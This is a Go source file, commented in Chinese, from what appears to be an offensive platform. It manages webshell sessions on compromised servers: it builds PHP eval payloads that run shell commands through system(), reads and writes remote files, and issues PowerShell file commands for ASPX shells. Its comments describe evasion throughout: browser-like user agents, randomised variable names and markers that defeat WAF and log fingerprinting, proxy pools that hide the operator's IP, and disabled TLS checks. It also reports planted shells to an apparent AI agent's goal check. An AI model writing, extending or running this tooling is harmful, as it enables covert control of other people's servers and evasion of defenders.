package server

// webshell.go —— WebShell 会话的「页面侧」实现：会话 CRUD + 命令执行 / 上传 /
// 下载 / payload 库。数据直接读写 <dataDir>/webshells.json（与 MCP 同一份文件），
// 不走 MCP 子进程，所以页面点一下就有响应。
//
// 与 MCP（/opt/artex/bin/webshell_mcp.py）的关系
// ---------------------------------------------
// MCP 是独立 Python 进程，Go 无法 import 同一份实现；为了不让「两套协议漂移」，
// 本文件是那套载荷协议的 Go 移植，模板/标记/清洗规则逐字对齐 Python 侧，并且
// webshell_test.go 里用 Python 实际输出的黄金向量做回归——任何一侧改了协议，
// 测试立刻失败。协议约定（详见 webshell_mcp.py 头部注释）：
//
//	php      eval 一句话马：命令 base64 → 远端 base64_decode → system() 执行，
//	         ob_start() 捕获输出 → 回 <<标记>>base64<<标记>> → 客户端剥标记。
//	         标记按会话参数名派生（webshellMarkers），不含任何工具字样。
//	php_raw  代码执行马：cmd 直接当 PHP 代码跑（外层同样加标记与 base64 捕获）。
//	jsp      Runtime.getRuntime().exec(request.getParameter('pass'))
//	aspx     Process.Start("cmd.exe", "/c " + 参数)
//
// 安全约定：任何响应/日志都不回显 password（参数名）与自定义 header 的值。

import (
	"bytes"
	"compress/flate"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Autumn-27/artex/config"
	xproxy "golang.org/x/net/proxy"
	"golang.org/x/text/encoding/simplifiedchinese"
)

// ---------------------------------------------------------------------------
// 常量（与 webshell_mcp.py 顶部常量一一对应）
// ---------------------------------------------------------------------------

const (
	webshellStoreName = "webshells.json"

	webshellChunkDefault    = 512 * 1024
	webshellChunkMax        = 512 * 1024
	webshellUploadMax       = 32 * 1024 * 1024
	webshellDownloadDefault = 2 * 1024 * 1024
	webshellDownloadMax     = 64 * 1024 * 1024
	webshellExecOutputLimit = 100 * 1024
	webshellHTTPBodyLimit   = 16 * 1024 * 1024

	// 默认 UA 用普通浏览器。以前自报 "ARTEX-Webshell-MCP/1.0"，目标侧日志里一眼
	// 就能看出是谁在打；会话可用 user_agent 覆盖。
	webshellDefaultUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
		"(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

	// webshellProxyEnv 是全局默认出口代理（会话里的 proxy 优先）。都为空则直连。
	webshellProxyEnv = "ARTEX_WEBSHELL_PROXY"
)

var webshellValidTypes = []string{"php", "php_raw", "jsp", "aspx"}

var webshellPayloadTypes = []string{"php", "jsp", "aspx"}

// 常见一句话马自带的回显前后缀（只收录不会误伤正常输出的经典标记）
var webshellMarkerDirt = []string{"->|", "|<-", "<-|", "|->"}

var (
	// 会话名：允许中文，禁止控制字符与路径分隔符
	webshellNameRE      = regexp.MustCompile(`^[^\x00-\x1f\x7f/\\]{1,64}$`)
	webshellURLRE       = regexp.MustCompile(`(?i)^https?://`)
	webshellParamRE     = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_\-\[\]]{0,63}$`)
	webshellPayloadFile = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]*$`)
	// 文件头注释里的元信息标签：@summary / @scene / @perm / @bypass / @param / @mcp
	webshellPayloadMetaRE = regexp.MustCompile(`@(summary|scene|perm|bypass|param|mcp)\s+(.+)`)
	webshellANSIRE        = regexp.MustCompile(`\x1b\[[0-9;]*[A-Za-z]`)
	// 远端把「命令不存在」的错误当回显返回时，用这个识别「马类型不匹配」
	webshellShellErrRE = regexp.MustCompile(`(?i)(?:^|\n)\s*(?:/bin/)?(?:sh|bash|dash|zsh):\s*.*(?:not found|Syntax error)` +
		`|command not found` +
		`|is not recognized as an internal or external command` +
		`|不是内部或外部命令`)
	// WAF / 网关拦截页特征（这类响应绝不能当成命令回显返回给用户）
	webshellBlockRE = regexp.MustCompile(`(?i)<!doctype\s+html|<html[\s>]|<head[\s>]|request rejected|access denied` +
		`|web application firewall|拦截|禁止访问|非法请求|\b403\b|\b406\b`)
)

// webshellTransport 跳过 TLS 校验（目标常是自签证书）。与 Python 侧一致：
// 跟随环境变量代理、每次请求 Connection: close（不复用连接）。
var webshellTransport = &http.Transport{
	Proxy:              http.ProxyFromEnvironment,
	TLSClientConfig:    &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // 目标常是自签
	DisableKeepAlives:  true,
	DisableCompression: false,
	DialContext: (&net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: -1,
	}).DialContext,
}

// errWSModeMismatch 表示远端的马不是 PHP eval 型（HTTP 200 但没回标记），
// 调用方可降级为命令型上传/下载路径。
var errWSModeMismatch = errors.New("远端不是 PHP eval 型马")

// errWSSessionNotFound 用于把「会话不存在」映射成 404。
var errWSSessionNotFound = errors.New("会话不存在")

// errWSPayloadInvalid / errWSPayloadNotFound 让 payload 的入参错误与「不存在」
// 分别映射成 400 / 404，而不是一律 500。
var (
	errWSPayloadInvalid  = errors.New("payload 名称非法")
	errWSPayloadNotFound = errors.New("payload 不存在")
)

// 进程内的载荷模式缓存：{会话名: "eval" | "raw"}。只影响性能（少发一次试探
// 请求），不落盘；进程重启后重新探测。与 Python 侧的 _MODE_CACHE 等价。
var (
	webshellModeMu    sync.Mutex
	webshellModeCache = map[string]string{}
)

// 会话库的读改写需要串行化（页面与 MCP 进程之外的并发请求）。
var webshellStoreMu sync.Mutex

// webshellWinAbsRE 判断是不是 Windows 绝对路径（C:\... 或 C:/...）。
var webshellWinAbsRE = regexp.MustCompile(`^[A-Za-z]:[\\/]`)

// 剥载荷说明注释用：起始 PHP 标记 + 紧跟的 /* ... */ 说明块。
var (
	webshellPHPTagRE             = regexp.MustCompile(`(?i)^<\?(?:php|=)?`)
	webshellPayloadHeadCommentRE = regexp.MustCompile(`(?s)^\s*/\*.*?\*/`)
)

// ---------------------------------------------------------------------------
// 数据模型
// ---------------------------------------------------------------------------

// webshellSession 是 webshells.json 里的一条记录；字段名必须与 Python 侧一致，
// 否则两个入口写出来的文件会互相读不懂（password 是参数名，不是口令）。
type webshellSession struct {
	URL      string            `json:"url"`
	Type     string            `json:"type"`
	Password string            `json:"password"`
	Method   string            `json:"method"`
	Header   map[string]string `json:"header"`
	Note     string            `json:"note"`
	// RemotePath 是马的绝对落地路径：清痕迹时要靠它（命令型马没它就只能人工删）。
	RemotePath string `json:"remote_path,omitempty"`
	// Artifacts 是经上传接口写到远端的文件，删会话时一并清理。
	Artifacts []string `json:"artifacts,omitempty"`
	// Proxy 是这条会话的出口代理：socks5h://user:pass@host:port 或 http://...，
	// 也接受逗号分隔的池。为空则用 ARTEX_WEBSHELL_PROXY，再为空就直连。
	// 目的是让目标侧只看到代理/节点 IP，看不到平台地址。
	Proxy string `json:"proxy,omitempty"`
	// UserAgent 覆盖默认 UA；为空用普通浏览器 UA（不带任何工具名）。
	UserAgent string `json:"user_agent,omitempty"`
	// ProxyRotate 为真时每一次请求都换出口（代理池）。默认否：同一会话固定一个
	// 出口 IP——出口 IP 本身会变，同一个马老换来源 IP 反而更显眼。
	ProxyRotate bool   `json:"proxy_rotate,omitempty"`
	CreatedAt   string `json:"created_at"`
	UpdatedAt   string `json:"updated_at,omitempty"`
}

// webshellSessionView 是列表接口的返回项：绝不带 password 与 header 的值。
type webshellSessionView struct {
	Name       string   `json:"name"`
	URL        string   `json:"url"` // 已把 query 里的 pass/pwd 等值打码
	Type       string   `json:"type"`
	Method     string   `json:"method"`
	Note       string   `json:"note"`
	RemotePath string   `json:"remote_path,omitempty"`
	Artifacts  []string `json:"artifacts,omitempty"`
	// Proxy 只回打码后的形态（账密换成 ***），前端要能看出「走没走代理、走哪个」
	Proxy       string   `json:"proxy,omitempty"`
	Egress      string   `json:"egress,omitempty"` // 实际出口：代理地址或「直连」
	UserAgent   string   `json:"user_agent,omitempty"`
	ProxyRotate bool     `json:"proxy_rotate,omitempty"`
	CreatedAt   string   `json:"created_at"`
	UpdatedAt   string   `json:"updated_at,omitempty"`
	ParamSet    bool     `json:"param_set"`   // 是否自定义了参数名
	HasHeader   bool     `json:"has_header"`  // 是否有自定义 header
	HeaderKeys  []string `json:"header_keys"` // 只有键名，没有值
}

// webshellPayloadMeta 是 payload 文件头注释里的 @ 元信息。
type webshellPayloadMeta struct {
	Summary string `json:"summary,omitempty"`
	Scene   string `json:"scene,omitempty"`
	Perm    string `json:"perm,omitempty"`
	Bypass  string `json:"bypass,omitempty"`
	Param   string `json:"param,omitempty"`
	MCP     string `json:"mcp,omitempty"`
}

// webshellPayloadEntry 是 GET /api/webshell/payloads 的一条。
type webshellPayloadEntry struct {
	Name string              `json:"name"` // <type>/<file>
	Type string              `json:"type"`
	File string              `json:"file"`
	Size int                 `json:"size"`
	Meta webshellPayloadMeta `json:"meta"`
}

// ---------------------------------------------------------------------------
// 路径
// ---------------------------------------------------------------------------

// webshellDataDir 返回会话库目录（默认就是后端 dataDir，即 VPS 上的
// /opt/artex/data）。ARTEX_WEBSHELL_DIR 仅用于测试时指向临时目录。
func (s *Server) webshellDataDir() string {
	if d := strings.TrimSpace(os.Getenv("ARTEX_WEBSHELL_DIR")); d != "" {
		return d
	}
	if s != nil && s.m != nil && strings.TrimSpace(s.m.dir) != "" {
		return s.m.dir
	}
	return filepath.Join(config.BaseDir(), "data")
}

// webshellStorePath 是会话库文件（权限 600）。
func (s *Server) webshellStorePath() string {
	return filepath.Join(s.webshellDataDir(), webshellStoreName)
}

// webshellPayloadRoot 是内置 payload 库根目录（VPS 上是
// /opt/artex/payloads/webshell）。ARTEX_WEBSHELL_PAYLOAD_DIR 仅用于测试。
func webshellPayloadRoot() string {
	if d := strings.TrimSpace(os.Getenv("ARTEX_WEBSHELL_PAYLOAD_DIR")); d != "" {
		return d
	}
	return filepath.Join(config.BaseDir(), "payloads", "webshell")
}

// ---------------------------------------------------------------------------
// 会话库读写（原子写 + 0600，与 Python 侧 _save_store 一致）
// ---------------------------------------------------------------------------

func webshellLoadStore(path string) (map[string]webshellSession, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return map[string]webshellSession{}, nil
		}
		return nil, fmt.Errorf("读取会话库失败（%s）: %v", path, err)
	}
	if len(bytes.TrimSpace(raw)) == 0 {
		return map[string]webshellSession{}, nil
	}
	var store map[string]webshellSession
	if err := json.Unmarshal(raw, &store); err != nil {
		return nil, fmt.Errorf("会话库不是合法 JSON（%s）: %v", path, err)
	}
	if store == nil {
		store = map[string]webshellSession{}
	}
	return store, nil
}

func webshellSaveStore(path string, store map[string]webshellSession) error {
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return fmt.Errorf("创建会话库目录失败（%s）: %v", dir, err)
	}
	buf, err := json.MarshalIndent(store, "", "  ")
	if err != nil {
		return fmt.Errorf("序列化会话库失败: %v", err)
	}
	buf = append(buf, '\n')
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, buf, 0o600); err != nil {
		return fmt.Errorf("写入会话库失败（%s）: %v", tmp, err)
	}
	if err := os.Chmod(tmp, 0o600); err != nil {
		return fmt.Errorf("设置会话库权限失败（%s）: %v", tmp, err)
	}
	if err := os.Rename(tmp, path); err != nil {
		return fmt.Errorf("保存会话库失败（%s）: %v", path, err)
	}
	return nil
}

func (s *Server) webshellSessionByName(name string) (webshellSession, error) {
	path := s.webshellStorePath()
	webshellStoreMu.Lock()
	store, err := webshellLoadStore(path)
	webshellStoreMu.Unlock()
	if err != nil {
		return webshellSession{}, err
	}
	sess, ok := store[name]
	if !ok {
		return webshellSession{}, fmt.Errorf("%w: %s（先在左侧添加一个会话）", errWSSessionNotFound, name)
	}
	return sess, nil
}

// landedShellForExploration 判断本探索的任务资产上是否已有登记的 WebShell 会话。
// 注入给 agent.ShellSessionLanded：prove_goal 校验 shell 目标时，活动记录里查不到
// shell_add（页面上手工登记、别的进程调 MCP）也要算数，否则真落了马还被判「没拿到」。
func (s *Server) landedShellForExploration(explorationID int64) bool {
	if s == nil || s.m == nil || s.m.pg == nil || explorationID <= 0 {
		return false
	}
	sessions, err := s.webshellAllSessions()
	if err != nil || len(sessions) == 0 {
		return false
	}
	seen := map[string]bool{}
	hosts := make([]string, 0, len(sessions))
	for _, sess := range sessions {
		u, perr := url.Parse(strings.TrimSpace(sess.URL))
		if perr != nil {
			continue
		}
		h := u.Hostname()
		if h == "" || seen[h] {
			continue
		}
		seen[h] = true
		hosts = append(hosts, h)
	}
	if len(hosts) == 0 {
		return false
	}
	ok, err := s.m.pg.Exploration(explorationID).HasLandedShellSession(hosts)
	return err == nil && ok
}

func (s *Server) webshellAllSessions() (map[string]webshellSession, error) {
	webshellStoreMu.Lock()
	defer webshellStoreMu.Unlock()
	return webshellLoadStore(s.webshellStorePath())
}

// webshellView 把存储记录转成可下发的视图（打码 password / header 值）。
func webshellView(name string, sess webshellSession) webshellSessionView {
	keys := make([]string, 0, len(sess.Header))
	for k := range sess.Header {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	view := webshellSessionView{
		Name:        name,
		URL:         webshellRedactURL(sess.URL),
		Type:        sess.Type,
		Method:      sess.Method,
		Note:        sess.Note,
		RemotePath:  sess.RemotePath,
		Artifacts:   sess.Artifacts,
		Proxy:       webshellRedactProxy(sess.Proxy),
		Egress:      webshellEgressLabel(sess),
		UserAgent:   sess.UserAgent,
		ProxyRotate: sess.ProxyRotate,
		CreatedAt:   sess.CreatedAt,
		UpdatedAt:   sess.UpdatedAt,
		ParamSet:    strings.TrimSpace(sess.Password) != "" && strings.TrimSpace(sess.Password) != "pass",
		HasHeader:   len(keys) > 0,
		HeaderKeys:  keys,
	}
	return view
}

// webshellRedactProxy 把出口代理里的账密打码（代理链常有 username:password）。
func webshellRedactProxy(raw string) string {
	if strings.TrimSpace(raw) == "" {
		return ""
	}
	parts := webshellProxyPool(raw)
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		u, err := url.Parse(p)
		if err != nil || u.User == nil {
			out = append(out, p)
			continue
		}
		u.User = url.UserPassword("***", "***")
		out = append(out, u.String())
	}
	return strings.Join(out, ",")
}

// webshellEgressLabel 给页面显示当前实际出口：平台代理 / 显式代理 / 直连。
func webshellEgressLabel(sess webshellSession) string {
	raw := webshellProxyOf(sess)
	if raw == "" {
		if strings.TrimSpace(sess.Proxy) != "" {
			return "直连（会话强制）"
		}
		return "直连（未起平台代理，目标能看到平台 IP）"
	}
	pool := webshellProxyPool(raw)
	label := webshellRedactProxy(webshellPickProxy(raw, strings.TrimSpace(sess.URL), sess.ProxyRotate))
	if len(pool) > 1 {
		mode := "本会话固定"
		if sess.ProxyRotate {
			mode = "每请求轮换"
		}
		label += fmt.Sprintf("（%d 个池，%s）", len(pool), mode)
	}
	if strings.TrimSpace(sess.Proxy) == "" {
		if strings.TrimSpace(os.Getenv("ARTEX_PLATFORM_PROXY")) == "" && raw == proxyEgressURL {
			return "平台代理（随订阅节点变化）"
		}
		return "平台代理 " + label
	}
	return label
}

// webshellRedactURL 把 URL query 里像是「参数名」的键值打码（与 Python 侧一致）。
func webshellRedactURL(raw string) string {
	u, err := url.Parse(raw)
	if err != nil || u.RawQuery == "" {
		return raw
	}
	q := u.Query()
	changed := false
	for k := range q {
		switch strings.ToLower(k) {
		case "pass", "password", "pwd", "cmd", "c":
			q.Set(k, "***")
			changed = true
		}
	}
	if !changed {
		return raw
	}
	u.RawQuery = q.Encode()
	return u.String()
}

// ---------------------------------------------------------------------------
// 通用小工具
// ---------------------------------------------------------------------------

func webshellSeconds(v, def, lo, hi int) time.Duration {
	if v <= 0 {
		v = def
	}
	if v < lo {
		v = lo
	}
	if v > hi {
		v = hi
	}
	return time.Duration(v) * time.Second
}

func webshellClampInt(v, lo, hi int) int {
	if v < lo {
		return lo
	}
	if v > hi {
		return hi
	}
	return v
}

// webshellBrief 截断长文本用于错误摘要。
func webshellBrief(text string, limit int) string {
	t := strings.TrimSpace(text)
	t = webshellANSIRE.ReplaceAllString(t, "")
	t = webshellBlankLineRE.ReplaceAllString(t, "\n")
	if len(t) > limit {
		t = t[:limit] + "…(已截断)"
	}
	return t
}

func webshellDecodeBody(raw []byte) string {
	if len(raw) == 0 {
		return ""
	}
	if utf8Valid(raw) {
		return string(raw)
	}
	if out, err := simplifiedchinese.GB18030.NewDecoder().Bytes(raw); err == nil {
		return string(out)
	}
	return string(raw)
}

// utf8Valid 判断字节串是否是合法 UTF-8（避免引入 unicode/utf8 之外的依赖）。
func utf8Valid(b []byte) bool {
	for i := 0; i < len(b); {
		c := b[i]
		if c < 0x80 {
			i++
			continue
		}
		var n int
		switch {
		case c&0xE0 == 0xC0:
			n = 2
		case c&0xF0 == 0xE0:
			n = 3
		case c&0xF8 == 0xF0:
			n = 4
		default:
			return false
		}
		if i+n > len(b) {
			return false
		}
		for j := 1; j < n; j++ {
			if b[i+j]&0xC0 != 0x80 {
				return false
			}
		}
		i += n
	}
	return true
}

func webshellB64Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

// webshellB64Decode 宽松 base64 解码：去空白、补 padding、容忍 urlsafe 变体
// 与多余的尾部 '='（对齐 Python 侧 b64d 的宽容度）。
func webshellB64Decode(text string) ([]byte, error) {
	s := strings.Map(func(r rune) rune {
		switch r {
		case ' ', '\t', '\r', '\n', '\v', '\f':
			return -1
		}
		return r
	}, text)
	s = strings.ReplaceAll(s, "-", "+")
	s = strings.ReplaceAll(s, "_", "/")
	s = strings.TrimRight(s, "=")
	if pad := len(s) % 4; pad != 0 {
		s += strings.Repeat("=", 4-pad)
	}
	if s == "" {
		return nil, nil
	}
	return base64.StdEncoding.DecodeString(s)
}

// webshellIsText 判断字节串是不是「看起来像文本」：无 NUL、能按 utf-8/gb18030
// 解码，且解码后基本可打印。
//
// 最后的「可打印」这一条比 MCP 的 _is_text 更严一点，因为这里的判定直接决定
// 页面把内容当文本回还是当 base64 回：GB18030 几乎能「解码」任意字节串，若不看
// 可打印比例，一个 zip / elf 会被当成文本下发，前端保存时就不可逆地变成乱码。
func webshellIsText(data []byte) bool {
	if len(data) == 0 {
		return true
	}
	head := data
	if len(head) > 8192 {
		head = head[:8192]
	}
	if bytes.IndexByte(head, 0) >= 0 {
		return false
	}
	if utf8Valid(data) {
		return webshellPrintable(data)
	}
	out, err := simplifiedchinese.GB18030.NewDecoder().Bytes(data)
	if err != nil {
		return false
	}
	return webshellPrintable(out)
}

// webshellPrintable 判断解码后的文本是否基本可打印（用于识别 base64 出来的真回显）。
func webshellPrintable(data []byte) bool {
	if !utf8Valid(data) {
		return false
	}
	text := string(data)
	bad := 0
	for _, r := range text {
		if r < 32 && r != '\r' && r != '\n' && r != '\t' {
			bad++
		}
	}
	n := len(text)
	if n < 1 {
		n = 1
	}
	return bad*20 <= n
}

// webshellShellQuote 是 POSIX shell 单引号转义（对齐 Python 侧 _shq）。
func webshellShellQuote(path string) string {
	return "'" + strings.ReplaceAll(path, "'", `'\''`) + "'"
}

// ---------------------------------------------------------------------------
// 载荷构造（与 Python 侧逐字一致，见 webshell_test.go 的黄金向量）
// ---------------------------------------------------------------------------

// webshellMarkers 按会话参数名派生回显标记。
//
// 以前是固定常量 <<ARTEXMKB>>/<<ARTEXMKE>>：响应一旦被完整记录（WAF 日志、
// 目标侧 nginx 日志、流量留存），看一眼就知道是哪个工具在打。现在标记随参数名
// 变、同一会话内稳定、跨会话不同，且不含任何品牌词。
// 算法与 webshell_mcp.py 的 _markers() 一致：sha256("m:"+参数名) 前 3 字节的 hex。
func webshellMarkers(sess webshellSession) (string, string) {
	key := strings.TrimSpace(sess.Password)
	if key == "" {
		key = "pass"
	}
	sum := sha256.Sum256([]byte("m:" + key))
	tag := hex.EncodeToString(sum[:3])
	return "<<" + tag + "b>>", "<<" + tag + "e>>"
}

// webshellVarRoles 是生成 PHP 代码时各类临时变量用到的角色字母。
// 与 Python 侧 _php_names() 的键一一对应：cmd/out/path/data/n/size/buf/self/inc/list/res。
const webshellVarRoles = "copdnsrfglv"

// webshellVarNames 每次生成一段 PHP 代码就取一组一次性变量名。
//
// 固定用 $__artex_xxx 等于把工具名写进每个请求的 eval 代码——WAF 把 base64 解
// 一层就能认出是谁家的工具。现在后缀每次随机，嵌套的两段代码各自随机（26^5
// 的空间撞不上）。命名规则与 Python 侧一致：$_(5 位小写字母)(角色字母)。
func webshellVarNames() map[string]string {
	suf := webshellRandSuffix(5)
	out := make(map[string]string, len(webshellVarRoles))
	for i := 0; i < len(webshellVarRoles); i++ {
		out[webshellVarRoles[i:i+1]] = "$_" + suf + webshellVarRoles[i:i+1]
	}
	return out
}

// webshellRandSuffix 取 n 位随机小写字母（crypto/rand）。
func webshellRandSuffix(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	buf := make([]byte, n)
	if _, err := rand.Read(buf); err != nil {
		// crypto/rand 失败极罕见；退化成时间派生，宁可指纹弱一点也不中断执行
		seed := time.Now().UnixNano()
		for i := range buf {
			buf[i] = byte(seed >> (uint(i%8) * 8))
		}
	}
	out := make([]byte, n)
	for i := range buf {
		out[i] = letters[int(buf[i])%len(letters)]
	}
	return string(out)
}

// webshellPHPCommandPayload：type=php（eval 马），base64 传命令 + system() 执行
// + ob 捕获 + 标记回传。
func webshellPHPCommandPayload(cmd string, sess webshellSession) string {
	b := webshellB64Encode([]byte(cmd))
	n := webshellVarNames()
	mkb, mke := webshellMarkers(sess)
	return fmt.Sprintf("%s=base64_decode('%s');"+
		"ob_start();@system(%s);%s=ob_get_clean();"+
		"echo '%s'.base64_encode(%s).'%s';",
		n["c"], b, n["c"], n["o"], mkb, n["o"], mke)
}

// webshellPHPCodePayload：type=php_raw，把 cmd 当 PHP 代码执行。
func webshellPHPCodePayload(code string, sess webshellSession) string {
	c := strings.TrimSpace(code)
	if c == "" {
		return ""
	}
	if !strings.HasSuffix(c, ";") && !strings.HasSuffix(c, "}") {
		c += ";"
	}
	n := webshellVarNames()
	mkb, mke := webshellMarkers(sess)
	return fmt.Sprintf("ob_start();%s%s=ob_get_clean();"+
		"echo '%s'.base64_encode(%s).'%s';", c, n["o"], mkb, n["o"], mke)
}

// webshellPHPWriteCode：拼 PHP 文件写入代码（外层再包 webshellPHPCodePayload）。
func webshellPHPWriteCode(remotePath string, data []byte, appendMode bool) string {
	p := webshellB64Encode([]byte(remotePath))
	d := webshellB64Encode(data)
	mode := "0"
	if appendMode {
		mode = "FILE_APPEND"
	}
	n := webshellVarNames()
	return fmt.Sprintf("%s=base64_decode('%s');%s=base64_decode('%s');"+
		"%s=@file_put_contents(%s,%s,%s);"+
		"echo (%s===false)?('ERR'):('OK:'.%s);",
		n["p"], p, n["d"], d, n["n"], n["p"], n["d"], mode, n["n"], n["n"])
}

// webshellPHPReadCode：拼 PHP 文件读取代码，回 'OK|原始大小|base64(内容)'。
func webshellPHPReadCode(remotePath string, maxBytes int) string {
	p := webshellB64Encode([]byte(remotePath))
	n := webshellVarNames()
	return fmt.Sprintf("%s=base64_decode('%s');%s=@filesize(%s);"+
		"%s=@file_get_contents(%s,false,null,0,%d);"+
		"echo (%s===false)?('ERR'):('OK|'.%s.'|'.base64_encode(%s));",
		n["p"], p, n["s"], n["p"], n["r"], n["p"], maxBytes, n["r"], n["s"], n["r"])
}

// webshellPowerShellWriteCmd：aspx（Windows）写文件，走 PowerShell 单行命令。
func webshellPowerShellWriteCmd(remotePath, dataB64 string, appendMode bool) string {
	p := strings.ReplaceAll(remotePath, "'", "''")
	var body string
	if appendMode {
		body = fmt.Sprintf("$o=[IO.File]::ReadAllBytes('%s');"+
			"[IO.File]::WriteAllBytes('%s',$o+[Convert]::FromBase64String('%s'))", p, p, dataB64)
	} else {
		body = fmt.Sprintf("[IO.File]::WriteAllBytes('%s',[Convert]::FromBase64String('%s'))", p, dataB64)
	}
	return fmt.Sprintf(`powershell -NoProfile -NonInteractive -Command "%s"`, body)
}

// webshellPowerShellReadCmd：aspx 读文件，回 'OK|原始大小|base64(内容)'。
func webshellPowerShellReadCmd(remotePath string, maxBytes int) string {
	p := strings.ReplaceAll(remotePath, "'", "''")
	body := fmt.Sprintf("$b=[IO.File]::ReadAllBytes('%s');$n=$b.Length;"+
		"if($n -gt %d){$b=$b[0..(%d-1)]};"+
		"Write-Output ('OK|'+$n+'|'+[Convert]::ToBase64String($b))", p, maxBytes, maxBytes)
	return fmt.Sprintf(`powershell -NoProfile -NonInteractive -Command "%s"`, body)
}

// webshellExtractMarked 从响应里抠出标记之间的 base64 并解码。
func webshellExtractMarked(text string, sess webshellSession) (string, bool, error) {
	markerBegin, markerEnd := webshellMarkers(sess)
	i := strings.Index(text, markerBegin)
	if i < 0 {
		return "", false, nil
	}
	start := i + len(markerBegin)
	j := strings.Index(text[start:], markerEnd)
	if j < 0 {
		return "", false, nil
	}
	blob := text[start : start+j]
	dec, err := webshellB64Decode(blob)
	if err != nil {
		return "", false, fmt.Errorf("标记内不是合法 base64（%v）: %s", err, webshellBrief(blob, 120))
	}
	return webshellDecodeBody(dec), true, nil
}

// webshellCleanPlain 清洗命令型马的回显：去标记、去 NUL、按需解 base64，只留 stdout。
func webshellCleanPlain(text string, allowB64 bool) string {
	t := strings.ReplaceAll(text, "\x00", "")
	for _, m := range webshellMarkerDirt {
		t = strings.ReplaceAll(t, m, "")
	}
	s := strings.TrimSpace(t)
	if allowB64 && len(s) >= 4 && webshellB64LookingRE.MatchString(s) {
		if dec, err := webshellB64Decode(s); err == nil && len(dec) > 0 && webshellPrintable(dec) {
			t = webshellDecodeBody(dec)
		}
	}
	return strings.Trim(t, "\r\n")
}

var webshellB64LookingRE = regexp.MustCompile(`^[A-Za-z0-9+/=\s]+$`)

var (
	webshellBlankLineRE = regexp.MustCompile(`\s+\n`)
	// 'OK:<写入字节数>'（PHP file_put_contents 每块回执）
	webshellOKWriteRE = regexp.MustCompile(`^OK:(\d+)$`)
	// 'OK|<原始大小>|'（读文件回执前缀）
	webshellOKSizeRE = regexp.MustCompile(`^OK\|(\d+)\|`)
	webshellDigitsRE = regexp.MustCompile(`(\d+)`)
)

func webshellLooksBlocked(text string) bool {
	return webshellBlockRE.MatchString(text)
}

// ---------------------------------------------------------------------------
// HTTP 层：发一次载荷请求
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// 出口隔离：会话级代理
//
// WebShell 的请求以前是平台直连出去的，目标侧 nginx 日志里直接记着平台 IP，
// 一出事就是「顺着这个 IP 摸回来」。现在每条会话可以配一个出口代理（socks5h /
// http，可带账密，也可以给一串让每次请求随机挑），没配就看全局环境变量，
// 都没有才直连（并在页面上明确显示「直连」）。
// ---------------------------------------------------------------------------

// webshellProxyPool 把「a,b,c」形式的代理池拆成列表（支持逗号/分号/空白分隔）。
func webshellProxyPool(raw string) []string {
	fields := strings.FieldsFunc(raw, func(r rune) bool {
		return r == ',' || r == ';' || r == '\n' || r == '\t' || r == ' '
	})
	out := make([]string, 0, len(fields))
	for _, f := range fields {
		if f = strings.TrimSpace(f); f != "" {
			out = append(out, f)
		}
	}
	return out
}

// webshellProxyOf 取这条会话该用的出口。
//
// 默认跟随平台代理：代理订阅里选中的节点由 sing-box 边车暴露在 127.0.0.1:7890，
// 换节点时出口 IP 自动跟着变，不用改会话配置。边车没起就直连。
// 会话可以显式指定别的代理（可给一串做池），或填 direct 强制直连。
func webshellProxyOf(sess webshellSession) string {
	raw := strings.TrimSpace(sess.Proxy)
	switch strings.ToLower(raw) {
	case "direct", "off", "none", "直连":
		return ""
	case "":
		if p := webshellPlatformEgress(); p != "" {
			return p
		}
		// 没有平台代理时，允许部署时用环境变量兜一个
		return strings.TrimSpace(os.Getenv(webshellProxyEnv))
	default:
		return raw
	}
}

var (
	webshellEgressMu  sync.Mutex
	webshellEgressAt  time.Time
	webshellEgressVal string
)

// webshellPlatformEgress 返回平台代理的出口地址；边车没起就返回空（直连）。
//
// 用本地端口探测而不是查边车状态：边车进程还在但端口不通时照样发不出请求，
// 探测比状态更如实。结果缓存几秒，免得每个请求都连一次。
func webshellPlatformEgress() string {
	if v := strings.TrimSpace(os.Getenv("ARTEX_PLATFORM_PROXY")); v != "" {
		switch strings.ToLower(v) {
		case "off", "direct", "none", "0":
			return "" // 显式关掉：部署时不希望 WebShell 走平台代理
		}
		return v // 部署时想改地址/形态（http 或换端口）走这个
	}
	webshellEgressMu.Lock()
	defer webshellEgressMu.Unlock()
	if time.Since(webshellEgressAt) < 5*time.Second {
		return webshellEgressVal
	}
	webshellEgressAt = time.Now()
	webshellEgressVal = ""
	conn, err := net.DialTimeout("tcp", proxyListenAddr, 300*time.Millisecond)
	if err == nil {
		_ = conn.Close()
		webshellEgressVal = proxyEgressURL
	}
	return webshellEgressVal
}

// webshellPickProxy 从代理池里挑一个。
//
// 默认按会话稳定选（同一个马始终同一出口）：出口 IP 本来就会变，而一个马的请求
// 老是从不同来源 IP 打过来，目标侧反而更容易注意到。只有显式 rotate（会话字段
// proxy_rotate）才每次随机，用于对冲「单个出口被封」。
// 挑法用 sha256(sessionKey) 取模，与 Python 侧一致。
func webshellPickProxy(raw, sessionKey string, rotate bool) string {
	pool := webshellProxyPool(raw)
	switch len(pool) {
	case 0:
		return ""
	case 1:
		return pool[0]
	}
	if rotate || strings.TrimSpace(sessionKey) == "" {
		buf := make([]byte, 1)
		if _, err := rand.Read(buf); err != nil {
			return pool[0]
		}
		return pool[int(buf[0])%len(pool)]
	}
	sum := sha256.Sum256([]byte("p:" + sessionKey))
	return pool[int(binary.BigEndian.Uint32(sum[:4])%uint32(len(pool)))]
}

